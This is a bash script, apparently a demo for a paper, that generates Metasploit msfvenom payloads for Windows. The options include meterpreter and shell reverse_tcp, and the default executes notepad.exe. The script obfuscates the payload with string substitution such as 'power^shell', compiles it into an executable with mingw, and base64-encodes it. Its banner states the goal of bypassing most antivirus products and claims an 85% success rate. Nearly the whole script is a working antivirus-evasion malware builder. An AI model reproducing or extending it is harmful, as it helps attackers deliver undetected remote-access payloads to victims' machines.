
banner() {

printf "Demo Script\n"
printf "FOR DP Paper\n"
printf "Demonstarting simple string substitute and obfuscation to bypass most MODERAN AV'S\n"
printf "Demonstarting simple string substitute and obfuscation to bypass most MODERAN AV'S\n"
printf "Demonstarting simple string substitute and obfuscation to bypass most MODERAN AV'S\n"
printf "String spliting is one of the data privacy perserving scheme\n"
printf "We have used base64 as well, zip is optional\n"
printf "was able to bypass 85% of AV's with this simple method\n"


}

dependencies() {
#this depandency function is just copy paste
command -v msfvenom > /dev/null 2>&1 || { echo >&2 "msfvenom rewuired but it's not installed"; exit 1; }
command -v i686-w64-mingw32-gcc > /dev/null 2>&1 || { echo >&2 "I require mingw-w64 but it's not installed. Install it: apt-get update && apt-get install mingw-w64"; 
exit 1; }
command -v base64 > /dev/null 2>&1 || { echo >&2 "I require base64 but it's not installed. Install it. Aborting."; exit 1; }
command -v zip > /dev/null 2>&1 || { echo >&2 "I require Zip but it's not installed. Install it. Aborting."; exit 1; }

}

settings2() {

default_payload_name="ObfsTestPayload"
printf 'Payload name (Default: %s : ' $default_payload_name

read payload_name
payload_name="${payload_name:-${default_payload_name}}"


}

start() {

msf_venom
printf "\n"

printf "Begining process"

settings2
payload
#else
#printf "Invalid option\n"
#sleep 1
#clear
#start
#fi

}

msf_venom() {


#printf "windows/meterpreter/reverse_tcp\n" 
#printf "windows/shell/reverse_tcp\n"
##printf "windows/x64/meterpreter/reverse_tcp\n"
#printf "windows/x64/shell/reverse_tcp\n"
printf "press 5 for windows/x64/exec\n"


read -p $'\n[+] Choose a payload:' payload_option;
Y="rm"
if [[ $payload_option -eq 1 ]];then
payload_msf="windows/meterpreter/reverse_tcp"
elif [[ $payload_option -eq 2 ]];then
payload_msf="windows/shell/reverse_tcp"
elif [[ $payload_option -eq 3 ]];then
payload_msf="windows/x64/meterpreter/reverse_tcp"
elif [[ $payload_option -eq 4 ]];then
payload_msf="windows/x64/shell/reverse_tcp"
elif [[ $payload_option -eq 5 ]];then
payload_msf="windows/x64/exec"
else
printf "Invalid choice!\n"
sleep 2
msf_venom
fi
}

payload() {

q="c";z=".";

if [[ 1 == 1 ]];then
printf "building command for msfvenom"
fi

printf "Creating MSFVenom payload and Obfuscating with string obfuscate method\n"; X="1"
msfvenom -p $payload_msf cmd=notepad.exe -f psh-cmd -o $payload_name.bat > /dev/null 2>&1
if [[ $(cat "$payload_name".bat) == "" ]]; then
printf "Error no payload created!\n"
rm -rf $payload_name.bat
exit 1
fi
enc=$z$q 
msf=$(cat $payload_name.bat | sed 's/\%COMSPEC\% \/b \/c //g' |sed 's/\//\\\//g' | sed 's/powershell/power^shell/g')
sed -f - src/src.c > $X.$q << EOF
s/payload/${msf}/g
EOF
rm -rf $payload_name.bat
printf " Compiling with mingw-Building payload\n"
i686-w64-mingw32-gcc $X$enc -o "$payload_name".exe 
if [ -e "$payload_name".exe ]; then
if [ ! -d payloads/"$payload_name"/ ]; then
IFS=$'\n'
mkdir -p payloads/"$payload_name/"
fi
cp "$payload_name".exe payloads/"$payload_name"/"$payload_name".exe
printf "zip process optional uncomment from source to use zip feature"
printf "base64 endoing and replacing strings"
$Y -r $X.$q

#zip $payload_name.zip "$payload_name".exe > /dev/null 2>&1
IFS=$'\n'
data_base64=$(base64 -w 0 $payload_name.exe)
temp64="$( echo "${data_base64}" | sed 's/[\\&*./+!]/\\&/g' )"
printf " Converting binary to base64\n" 
<<EOF
s/data_base64/${temp64}/g
EOF
rm -rf src/temp > /dev/null 2>&1

printf "Payload saved:payloads/%s.exe\n" $payload_name
else
printf "Error compile error\n"
exit 1
fi
}

banner
dependencies
start

